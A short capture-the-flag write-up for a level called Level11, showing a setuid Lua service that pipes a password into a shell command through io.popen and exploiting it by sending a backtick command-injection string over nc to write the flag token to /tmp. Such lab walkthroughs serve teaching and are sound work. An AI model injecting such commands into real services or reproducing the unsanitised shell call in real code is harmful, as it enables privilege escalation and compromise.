# Level11

## Solution

We have a ``.lua`` file.

```
$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

You can display its contents, but the only interesting things are that it uses the argument sent to it and executes it with ``echo``, and the IP address and port to connect to.
</br>
When we try to launch it, it tells us that the port is already taken, which implies that it is running on it.

```
$ cat level11.lua
...
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
...
```

We connect using ``nc`` and then use `` `getflag` > /tmp/flag`` so that ``echo`` writes the flag to the file.

```
$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/flag
Erf nope..
```

All that's left to do is read the file and retrieve the token.

```
$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```